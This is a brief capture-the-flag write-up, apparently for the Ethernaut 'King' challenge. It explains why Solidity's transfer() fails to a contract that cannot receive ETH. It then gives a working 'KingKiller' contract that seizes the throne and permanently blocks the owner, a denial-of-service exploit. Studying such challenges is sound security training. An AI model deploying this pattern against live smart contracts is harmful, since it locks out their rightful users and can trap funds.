#King

Since the owner of the King contract can bypass the first condition of the receive function
(msg.value >= value), we have to focus on the transfer function. Transfer functions will fail when
the address recipient is a smart contract with no payable function or fallback to receive ETH.
We can build a smart contract that simply beocmes king and then the owner will be unable to become
the king agian.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract KingKiller {
    address payable immutable i_kingAddr;
    bool success;
    constructor(address payable _kingAddr) {
        i_kingAddr = _kingAddr;
    }

    function becomeKing() public payable returns(bool){
        (bool s, ) = i_kingAddr.call{value: msg.value}("");
        return success = s;
    }

    function getSuccess() public view returns(bool){
        return success;
    }
}

```
